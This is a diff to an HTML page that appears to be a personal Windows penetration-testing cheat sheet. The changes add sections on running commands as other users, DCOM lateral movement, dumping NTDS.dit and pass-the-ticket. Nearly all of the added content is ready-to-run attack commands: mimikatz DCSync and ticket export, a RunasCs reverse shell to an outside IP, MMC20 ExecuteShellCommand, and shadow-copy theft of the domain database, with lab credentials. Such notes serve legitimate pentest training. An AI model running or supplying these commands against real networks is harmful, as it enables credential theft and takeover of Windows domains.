@@ -19,7 +19,7 @@
     <div id="navbar-container"></div>
 
     <div class="main-container">
-        <div class="sidebar" style="width: 500px;">
+        <div class="sidebar" style="width: 600px;">
             <h3>Quick content</h3>
             <ul id="sidebar-menu"></ul>
         </div>
@@ -956,26 +956,50 @@ mimikatz # sekurlsa::credman  </code></pre>
                         </ul>
                     </ul>
 
-                    <h2 id="Run commands as another user Runas.exe">Run commands as another user Runas.exe</h2>
+                    <h2 id="Run commands as another user">Run commands as another user</h2>
                     <ul>
                         <p>In case you are in an environment where you have credentials for another user but you are not able to stablish a connection though another port or similar there are some ways to execute commands as another user</p>
-                        <h3>Meh option</h3>
+                        <h3>Powershell option</h3>
                         <ul>
                             <p>You could use LOL tools in order to stablish a reverse shell. This option is good but it may fail due the instability of the shell</p>
                             <pre><code class="language-powershell">Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } </code></pre>
+                            <p>Or use the following code in order to execute command as another user. We must know the password of that user we are impersonating</p>
+                            <pre><code class="language-powershell">$username = 'jen';
+$password = 'Nexus123!';
+
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+$Options = New-CimSessionOption -Protocol DCOM
+
+$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+ 
+$Command = 'whoami'; #Place you shellcode here
+  
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};</code></pre>
+                             
+                        <p>Or by using winrsa option</p>
+                        <pre><code class="language-powershell">winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"</code></pre>        
                         </ul>
 
-                        <h3>Great option</h3>
+                        <h3>Executable option (runascs.exe)</h3>
                         <ul>
                             <p>Using RunasCs.exe it's a good option but we should use nc to stablish a proper shell</p>
                             <pre><code class="language-powershell">.\RunasCs.exe USER PASS powershell.exe -r 10.10.14.91:8000</code></pre>
                         </ul>
 
-                        <h3>Built-in option</h3>
+                        <h3>Built-in option </h3>
                         <ul>
                             <p>We can also run runas from the Windows terminal since it comes preinstalled. But in this case we must have access to the GUI since the password prompt will be required</p>
                             <pre><code class="language-powershell">runas /user:backupadmin cmd</code></pre>
                         </ul>
+
+                        <h3>Playing with DCOM</h3>
+                        <p> The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. The discovered DCOM lateral movement technique is based on the Microsoft Management Console (MMC) COM application that is employed for scripted automation of Windows systems. The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property. As its name suggests, this method allows the execution of any shell command if the authenticated user is authorized, which is the default for local administrators.</p>
+                        <pre><code class="language-powershell">$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))  #Target IP
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")  #Command you would like to run"</code></pre>
+                        
+ 
                     </ul>
 
                     <h2 id="Extracting SAM">Extracting SAM</h2>
@@ -1089,9 +1113,27 @@ mimikatz # misc::memssp</code></pre>
 impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'dc.administrator.htb'                                     #Remote dumping</code></pre>
                         <p>
                         <p>Crack the hash by using <b>-m 1000</b> in hashcat (NTLM)</p>
-                        <b>Other easier methods</b>
-                        <pre><code class="language-powershell">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</code></pre>
-                    
+                        
+                        <b>Other easy methods...</b>
+
+                        <h3>Using netexec</h3>
+                        <ul>
+                            <pre><code class="language-powershell">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</code></pre>
+                        </ul>
+
+                        <h3>Using mimikatz</h3>
+                        <ul>
+                            <pre><code class="language-powershell">lsadump::dcsync /user:corp\dave</code></pre>  
+                            <p>We can also extract all them all</p>
+                            <pre><code class="language-powershell">lsadump::dcsync /domain:corp.com /all  </code></pre>  
+                        </ul>
+
+                        <h3>Using vshadow.exe</h3>
+                        <ul>
+                            <pre><code class="language-powershell">.\vshadow.exe -nw -p  C:</code></pre>  
+                            <p>Take a look at the output and look for the parameter called <b> Shadow copy device name</b> now use it to copy any file</p>
+                            <pre><code class="language-powershell">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak</code></pre>
+                        </ul>
                     </ul>
 
                     <h2 id="WSL">WSL</h2>
@@ -1172,6 +1214,21 @@ Bypass-UAC -Method UacMethodSysprep</code></pre>
 
                     <h2 id="Pass the ticket">Pass the ticket</h2>
                     <ul>
+                        <h3>From mimikatz</h3>
+                        <ul>
+                            <p>In this case we are acquiring a ticket for the account jen. Obviously we need the password hash</p>
+                            <pre><code class="language-powershell">sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell</code></pre>
+                            <b>In case we don't know the password hash, we can dump all the cached tickets and reuse them</b>
+                            <pre><code class="language-powershell">privilege::debug
+sekurlsa::tickets /export #This Will export all ticket in a *.kirbi file</code></pre>
+                            <p>Now use one of the tickets exported. It must have the following format <b>username@cifs-web04.kirbi</b></p>
+                            <pre><code class="language-powershell">kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi</code></pre>    
+                            <p>Now perform a connection to an smb or similar to check if it works</p>    
+
+                        </ul>
+                        
+                        <h3>Using Rubeus</h3>
+                        <ul>
                         <p>First use mimikatz to obtain the aes256_hmac</p>
                         <pre><code class="language-powershell"> .\mimikatz.exe
 mimikatz # privilege::debug
@@ -1185,7 +1242,7 @@ mimikatz # sekurlsa::ekeys</code></pre>
                         <p>Now check if the ticket was exported using klist</p>
                         <p>Check if you can list files of the DC or another computer</p>    
                         <pre><code class="language-powershell">dir \\DC01\c$</code></pre>
-
+                        </ul>    
                     </ul>
 
                     <h2 id="Pass the certificate">Pass the certificate</h2>
